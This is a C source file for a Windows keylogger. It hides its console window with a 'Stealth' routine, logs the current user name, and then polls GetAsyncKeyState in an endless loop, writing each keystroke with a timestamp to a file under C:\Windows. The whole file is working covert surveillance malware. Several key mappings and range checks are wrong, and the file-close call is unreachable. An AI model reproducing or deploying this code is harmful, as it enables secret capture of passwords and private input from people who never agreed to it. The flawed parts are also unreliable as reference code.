// This program will only work with window 2000 version or above.

#include"keylogger.h"
#include<stdio.h>

#include "windows.h"

#include<string.h>
#include<stdlib.h>
#include<time.h>

void Stealth(); // function to hide console window.

int special_keys(int , FILE *); // function to identify special_keys.

int isCapsLock(void) // function to check status of caps lock.
{
  return (GetKeyState(VK_CAPITAL) & 0x0001);
}

int kwindows(void)
{
  FILE *fp = NULL ;
  fp = fopen("C:\\Windows\\Keylogs.txt","w");
  if(fp == NULL)
    exit(EXIT_FAILURE);

  Stealth();
  char val[5] , time[35] = {0}  ;
  FILE *username = NULL ;
  char user[30] ;
  username = _popen("echo %username%","r");
  fgets(user,30,username);
  if(username)
    {
      fputs("Logged User:",fp);
      fputs(user,fp);
      fputs("\n",fp);
    }
  else
    fputs("****Unable To fetch user-name.****\n",fp);

  while(1)
    {
      Sleep(10);
      for(int i=8;i<255;i++) // 8-255 represents range of possible key value using ascii codes. Source : https://www.asciitable.com/
	{
	  // Info About GetAsyncKeyState(): https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate
	  fflush(fp); // To flush fp stream.
	  if(GetAsyncKeyState(i)==-32767 && special_keys(i,fp)) // -32767 represents value in most significant bit is up( ie 1 ) which means key was pressed .
	    {
	      if (i >= 39 && i <= 64 ) // Keys 0-9
		{
		  format_time(time);
		  fputs(time,fp);
		  if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
		    {
		      switch (i)
			// 0x30-0x39 is 0-9 respectively
			{
			case 0x30: fputs(")",fp);
			  break;
			case 0x31: fputs("!",fp);
			  break;
			case 0x32: fputs("@",fp);
			  break;
			case 0x33: fputs("#",fp);
			  break;
			case 0x34: fputs("$",fp);
			  break;
			case 0x35: fputs("%",fp);
			  break;
			case 0x36: fputs("^",fp);
			  break;
			case 0x37: fputs("&",fp);
			  break;
			case 0x38: fputs("*",fp);
			  break;
			case 0x39: fputs("(",fp);
			  break;
			}
		    }
		  else // if shift key is not down
		    {
		      sprintf(val, "%c", i);
		      fputs(val,fp);
		    }
		  fputs("\n",fp);
		}
	      else if( i > 64 && i< 91 )
		{
		  format_time(time);
		  fputs(time,fp);
		  if ((GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase it will not work when caps lock is set and shift is used.
		    sprintf(val,"%c",i);
		  else
		    sprintf(val,"%c",i+32);
		  fputs(val,fp);
		  fputs("\n",fp);
		}
	    }
	}
    }
  fclose(fp);
  return 0 ;
}

void Stealth()
{
  HWND Stealth;
  AllocConsole(); // Allocate a new console for calling process.
  Stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(Stealth, 0); // ShowWindow() control how windows is shown and 0 represents SW_HIDE which means hide the window and activate another window.
}

int special_keys(int key , FILE *fp)
{
  char print_key[25] , time[65] ;
  switch(key)
    // VK_.. are virtual keycodes defined by Window API which are in hexadecimal but lies between 8-255.
    {
    case VK_DELETE : strcpy(print_key,"DELETE KEY");
      break;
    case VK_CANCEL : strcpy(print_key,"CANCEL KEY");
      break;
    case VK_BACK : strcpy(print_key,"BACKSPACE");
      break;
    case VK_LEFT : strcpy(print_key,"LEFT KEY");
      break;
    case VK_RIGHT :strcpy (print_key,"RIGHT KEY");
      break;
    case VK_UP : strcpy(print_key,"PAGE UP");
      break;
    case VK_DOWN : strcpy(print_key,"PAGE DN KEY,");
      break;
    case VK_END : strcpy(print_key,"END KEY");
      break;
    case VK_SNAPSHOT : strcpy(print_key,"PRINTSC");
      break;
    case VK_INSERT :  strcpy(print_key,"INSERT KEY");
      break;
    case VK_LCONTROL : strcpy(print_key,"LEFTCTRL");
      break;
    case VK_RCONTROL : strcpy(print_key,"RIGHTCTRL");
      break;
    case VK_SPACE : strcpy(print_key,"SPACE");
      break;
    case VK_LWIN : strcpy(print_key,"LEFT WINDOWS KEY");
      break ;
    case VK_RWIN : strcpy(print_key,"RIGHT WINDOWS KEY");
      break ;
    case VK_VOLUME_MUTE: strcpy(print_key,"VOLUME MUTE");
      break;
    case VK_VOLUME_DOWN: strcpy(print_key,"VOLUME DOWN");
      break;
    case VK_VOLUME_UP: strcpy(print_key,"VOLUME UP");
      break;
    case VK_SELECT: strcpy(print_key,"[Select]");
      break;
    case VK_HELP: strcpy(print_key,"[Help]");
      break;
    case VK_EXECUTE: strcpy(print_key,"[Execute]");
      break;
    case VK_CLEAR: strcpy(print_key,"[Clear]");
      break;
    case VK_RETURN: strcpy(print_key,"[Enter]");
      break;
    case VK_TAB: strcpy(print_key,"TAB");
      break;
    case VK_ESCAPE: strcpy(print_key,"ESC");
      break;
    case VK_NUMLOCK: strcpy(print_key,"NUMLOCK");
      break;
    case VK_SCROLL: strcpy(print_key,"SCROLL LOCK");
      break;
    case VK_HOME: strcpy(print_key,"[Home]");
      break;
    case VK_PLAY: strcpy(print_key,"[Play]");
      break;
    case VK_ZOOM: strcpy(print_key,"[Zoom]");
      break;
    case VK_DIVIDE: strcpy(print_key,"[/]");
      break;
    case VK_MULTIPLY: strcpy(print_key,"[*]");
      break;
    case VK_SUBTRACT: strcpy(print_key,"[-]");
      break;
    case VK_ADD: strcpy(print_key,"[+]");
      break;
    case VK_PRIOR: strcpy(print_key,"PAGE UP");
      break;
    case VK_NEXT: strcpy(print_key,"PAGE DOWN");
      break;
    case VK_NUMPAD0: strcpy(print_key,"[0]");
      break;
    case VK_NUMPAD1: strcpy(print_key,"[1]");
      break;
    case VK_NUMPAD2: strcpy(print_key,"[2]");
      break;
    case VK_NUMPAD3: strcpy(print_key,"[3]");
      break;
    case VK_NUMPAD4: strcpy(print_key,"[4]");
      break;
    case VK_NUMPAD5: strcpy(print_key,"[5]");
      break;
    case VK_NUMPAD6: strcpy(print_key,"[6]");
      break;
    case VK_NUMPAD7: strcpy(print_key,"[7]");
      break;
    case VK_NUMPAD8: strcpy(print_key,"[8]");
      break;
    case VK_NUMPAD9: strcpy(print_key,"[9]");
      break;
    case VK_F1: strcpy(print_key,"[F1]");
      break;
    case VK_F2: strcpy(print_key,"[F2]");
      break;
    case VK_F3: strcpy(print_key,"[F3]");
      break;
    case VK_F4: strcpy(print_key,"[F4]");
      break;
    case VK_F5: strcpy(print_key,"[F5]");
      break;
    case VK_F6: strcpy(print_key,"[F6]");
      break;
    case VK_F7: strcpy(print_key,"[F7]");
      break;
    case VK_F8: strcpy(print_key,"[F8]");
      break;
    case VK_F9: strcpy(print_key,"[F9]");
      break;
    case VK_F10: strcpy(print_key,"[F10]");
      break;
    case VK_F11: strcpy(print_key,"[F11]");
      break;
    case VK_F12: strcpy(print_key,"[F12]");
      break;
    case VK_F13: strcpy(print_key,"[F13]");
      break;
    case VK_F14: strcpy(print_key,"[F14]");
      break;
    case VK_F15: strcpy(print_key,"[F15]");
      break;
    case VK_F16: strcpy(print_key,"[F16]");
      break;
    case VK_F17: strcpy(print_key,"[F17]");
      break;
    case VK_F18: strcpy(print_key,"[F18]");
      break;
    case VK_F19: strcpy(print_key,"[F19]");
      break;
    case VK_F20: strcpy(print_key,"[F20]");
      break;
    case VK_F21: strcpy(print_key,"[F21]");
      break;
    case VK_F22: strcpy(print_key,"[F22]");
      break;
    case VK_F23: strcpy(print_key,"[F23]");
      break;
    case VK_F24: strcpy(print_key,"[F24]");
      break;
    case VK_OEM_2: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"?");
      else
	strcpy(print_key,"/");
      break;
    case VK_OEM_3: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"~");
      else
	strcpy(print_key,"`");
      break;
    case VK_OEM_4: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"{");
      else
	strcpy(print_key,"[");
      break;
    case VK_OEM_5: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"|");
      else
	strcpy(print_key,"\\");
      break;
    case VK_OEM_6: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"}");
      else
	strcpy(print_key,"]");
      break;
    case VK_OEM_7: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"\\");
      else
	strcpy(print_key,"'");
      break;
    case 0xBC:  if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"<");
      else
	strcpy(print_key,",");
      break;
    case 0xBE:  if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,">");
      else
	strcpy(print_key,".");
      break;
    case 0xBA :  if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,":");
      else
	strcpy(print_key,";");
      break;
    case 0xBD: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"_");
      else
	strcpy(print_key,"-");
      break;
    case 0xBB: if (GetAsyncKeyState(VK_SHIFT))
	strcpy(print_key,"+");
      else
	strcpy(print_key,"=");
      break;

    default : return 1 ;
    }
  format_time(time);
  strcat(time,print_key);
  fputs(time,fp);
  fputs("\n",fp);
  return 0 ;
}

